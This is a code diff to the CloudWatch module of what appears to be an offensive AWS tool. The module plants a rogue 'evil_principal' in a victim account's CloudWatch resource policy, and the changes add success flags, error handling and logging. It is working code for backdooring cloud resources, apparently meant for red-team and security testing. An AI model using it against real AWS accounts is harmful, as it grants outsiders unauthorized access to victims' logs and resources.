@@ -9,6 +9,7 @@ from endgame.exposure_via_resource_policies.common import ResourceType, Resource
 from endgame.shared.policy_document import PolicyDocument
 from endgame.shared.response_message import ResponseMessage
 from endgame.shared.list_resources_response import ListResourcesResponse
+from endgame.shared.response_message import ResponseGetRbp
 
 logger = logging.getLogger(__name__)
 
@@ -41,7 +42,7 @@ class CloudwatchResourcePolicy(ResourceType, ABC):
                     result = True
         return result
 
-    def _get_rbp(self) -> PolicyDocument:
+    def _get_rbp(self) -> ResponseGetRbp:
         """Get the resource based policy for this resource and store it"""
         # When there is no policy, let's return an empty policy to avoid breaking things
         empty_policy = constants.get_empty_policy()
@@ -73,30 +74,43 @@ class CloudwatchResourcePolicy(ResourceType, ABC):
                         override_resource_block=self.override_resource_block,
                         override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
                     )
-            return policy_document
+            success = True
+            response = ResponseGetRbp(policy_document=policy_document, success=success)
+            return response
         except botocore.exceptions.ClientError as error:
             logger.debug(error)
-            return policy_document
+            success = False
+            response = ResponseGetRbp(policy_document=policy_document, success=success)
+            return response
 
     def add_myself(self, evil_principal: str, dry_run: bool = False) -> ResponseMessage:
         """Add your rogue principal to the AWS resource"""
+        logger.debug(f"Adding {evil_principal} to {self.arn}")
         evil_policy = self.policy_document.policy_plus_evil_principal(
             victim_account_id=self.current_account_id,
             evil_principal=evil_principal,
             resource_arn=self.arn
         )
-
+        success = True
         if dry_run:
             operation = "DRY_RUN_ADD_MYSELF"
             message = (f"The CloudWatch resource policy named {constants.SID_SIGNATURE} exists. We need to remove it"
                        f" first, then we will add on the new policy.")
+            success = True
         else:
             operation = "ADD_MYSELF"
             self.undo(evil_principal=evil_principal)
-            self.client.put_resource_policy(policyName=constants.SID_SIGNATURE, policyDocument=json.dumps(evil_policy))
-            message = f"Added CloudWatch Resource Policy named {constants.SID_SIGNATURE}."
+            try:
+                self.client.put_resource_policy(policyName=constants.SID_SIGNATURE, policyDocument=json.dumps(evil_policy))
+                message = f"Added CloudWatch Resource Policy named {constants.SID_SIGNATURE}."
+                success = True
+            except botocore.exceptions.ClientError as error:
+                success = False
+                message = error
+                logger.critical(f"Operation was not successful for {self.service} {self.resource_type} "
+                                f"{self.name}. %s" % error)
 
-        response_message = ResponseMessage(message=message, operation=operation, evil_principal=evil_principal,
+        response_message = ResponseMessage(message=message, operation=operation, success=success, evil_principal=evil_principal,
                                            victim_resource_arn=self.arn, original_policy=self.original_policy,
                                            updated_policy=evil_policy, resource_type=self.resource_type,
                                            resource_name=self.name, service=self.service)
@@ -106,17 +120,21 @@ class CloudwatchResourcePolicy(ResourceType, ABC):
         new_policy = json.dumps(evil_policy)
         # https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/logs.html#CloudWatchLogs.Client.put_resource_policy
         # https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/logs.html#CloudWatchLogs.Client.put_destination_policy
+        success = True
         try:
             self.client.put_resource_policy(policyName=constants.SID_SIGNATURE, policyDocument=new_policy)
             message = "success"
+            success = True
         except self.client.exceptions.InvalidParameterException as error:
             logger.debug(error)
             logger.debug("Let's just try it again - AWS accepts it every other time.")
             self.client.put_resource_policy(policyName=constants.SID_SIGNATURE, policyDocument=new_policy)
             message = str(error)
+            success = True
         except botocore.exceptions.ClientError as error:
             message = str(error)
-        response_message = ResponseMessage(message=message, operation="set_rbp", evil_principal="",
+            success = True
+        response_message = ResponseMessage(message=message, operation="set_rbp", success=success, evil_principal="",
                                            victim_resource_arn=self.arn, original_policy=self.original_policy,
                                            updated_policy=evil_policy, resource_type=self.resource_type,
                                            resource_name=self.name, service=self.service)
@@ -128,15 +146,23 @@ class CloudwatchResourcePolicy(ResourceType, ABC):
         # https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/logs.html#CloudWatchLogs.Client.delete_resource_policy
         if not self.policy_exists:
             message = f"The policy {constants.SID_SIGNATURE} does not exist."
+            success = True
         else:
-            # TODO: Error handling for setting policy
-            self.client.delete_resource_policy(policyName=constants.SID_SIGNATURE)
-            message = f"Deleted the CloudWatch resource policy named {constants.SID_SIGNATURE}"
+            try:
+                self.client.delete_resource_policy(policyName=constants.SID_SIGNATURE)
+                message = f"Deleted the CloudWatch resource policy named {constants.SID_SIGNATURE}"
+                success = True
+            except botocore.exceptions.ClientError as error:
+                success = False
+                message = error
+                logger.critical(f"Operation was not successful for {self.service} {self.resource_type} "
+                                f"{self.name}. %s" % error)
         new_policy = constants.get_empty_policy()
-        response_message = ResponseMessage(message=message, operation=operation, evil_principal=evil_principal,
-                                           victim_resource_arn=self.arn, original_policy=self.original_policy,
-                                           updated_policy=new_policy, resource_type=self.resource_type,
-                                           resource_name=self.name, service=self.service)
+        response_message = ResponseMessage(message=message, operation=operation, success=success,
+                                           evil_principal=evil_principal, victim_resource_arn=self.arn,
+                                           original_policy=self.original_policy, updated_policy=new_policy,
+                                           resource_type=self.resource_type, resource_name=self.name,
+                                           service=self.service)
         return response_message
 
 
